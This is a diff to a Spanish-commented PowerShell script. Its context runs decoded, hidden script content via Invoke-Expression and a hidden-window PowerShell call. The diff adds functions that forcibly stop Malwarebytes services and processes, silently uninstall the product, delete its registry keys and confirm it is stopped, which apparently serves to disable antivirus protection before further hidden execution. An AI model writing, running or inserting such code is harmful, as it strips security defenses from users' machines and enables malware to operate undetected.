@@ -73,10 +73,113 @@ $script = [System.Text.Encoding]::Unicode.GetString($script_bytes)
 # Ejecutar el script
 Invoke-Expression $script
 
+############################################################################################################################
 
 
+# Función para detener servicios de Malwarebytes
+function Stop-MalwarebytesServices {
+    $services = Get-Service | Where-Object { $_.DisplayName -like "*Malwarebytes*" }
+    foreach ($service in $services) {
+        try {
+            Stop-Service -Name $service.Name -Force -ErrorAction Stop
+            Write-Output "Servicio $($service.Name) detenido."
+        } catch {
+            Write-Output "Error al detener el servicio $($service.Name): $_"
+        }
+    }
+}
+
+# Función para detener procesos de Malwarebytes
+function Stop-MalwarebytesProcesses {
+    $processes = Get-Process | Where-Object { $_.Name -like "*Malwarebytes*" }
+    foreach ($process in $processes) {
+        try {
+            Stop-Process -Name $process.Name -Force -ErrorAction Stop
+            Write-Output "Proceso $($process.Name) detenido."
+        } catch {
+            Write-Output "Error al detener el proceso $($process.Name): $_"
+        }
+    }
+}
+
+# Función para desinstalar Malwarebytes
+function Uninstall-Malwarebytes {
+    $app = Get-CimInstance -ClassName Win32_Product | Where-Object { $_.Name -like "*Malwarebytes*" }
+    if ($app) {
+        try {
+            $app.Uninstall() | Out-Null
+            Write-Output "Malwarebytes desinstalado."
+        } catch {
+            Write-Output "Error al desinstalar Malwarebytes: $_"
+        }
+    } else {
+        Write-Output "Malwarebytes no encontrado en la lista de productos instalados. Intentando desinstalación directa..."
+
+        # Intentar desinstalación directa con msiexec
+        $msiexecPath = "$env:SystemRoot\System32\msiexec.exe"
+        $uninstallString = " /x {ProductCode} /quiet /norestart"
+        $productCode = (Get-CimInstance Win32_Product | Where-Object { $_.Name -like "*Malwarebytes*" }).IdentifyingNumber
+        if ($productCode) {
+            Start-Process -FilePath $msiexecPath -ArgumentList $uninstallString.Replace("{ProductCode}", $productCode) -Wait
+            Write-Output "Malwarebytes desinstalado usando msiexec."
+        } else {
+            Write-Output "No se pudo encontrar el ProductCode de Malwarebytes para desinstalación directa."
+        }
+    }
+}
+
+# Función para eliminar entradas de registro de Malwarebytes
+function Remove-MalwarebytesRegistryEntries {
+    $registryPaths = @(
+        "HKLM:\SOFTWARE\Malwarebytes",
+        "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes",
+        "HKCU:\Software\Malwarebytes"
+    )
+
+    foreach ($path in $registryPaths) {
+        if (Test-Path $path) {
+            try {
+                Remove-Item -Path $path -Recurse -Force -ErrorAction Stop
+                Write-Output "Eliminada la entrada de registro: $path"
+            } catch {
+                Write-Output "Error al eliminar la entrada de registro $path: $_"
+            }
+        } else {
+            Write-Output "Entrada de registro no encontrada: $path"
+        }
+    }
+}
+
+# Función para confirmar que los servicios están detenidos
+function Confirm-ServicesStopped {
+    $services = Get-Service | Where-Object { $_.DisplayName -like "*Malwarebytes*" }
+    foreach ($service in $services) {
+        try {
+            $svc = Get-Service -Name $service.Name
+            if ($svc.Status -ne 'Stopped') {
+                Write-Output "El servicio $($service.Name) sigue en ejecución. Intentando detener de nuevo..."
+                Stop-Service -Name $service.Name -Force -ErrorAction Stop
+                Write-Output "Servicio $($service.Name) detenido."
+            } else {
+                Write-Output "El servicio $($service.Name) está detenido."
+            }
+        } catch {
+            Write-Output "Error al verificar el estado del servicio $($service.Name): $_"
+        }
+    }
+}
+
+# Ejecutar funciones
+Stop-MalwarebytesServices
+Stop-MalwarebytesProcesses
+Uninstall-Malwarebytes
+Remove-MalwarebytesRegistryEntries
+Confirm-ServicesStopped
+
+Write-Output "Proceso de eliminación de Malwarebytes completado."
 
 
+############################################################################################################################
 
 PowerShell.exe -WindowStyle hidden {
 
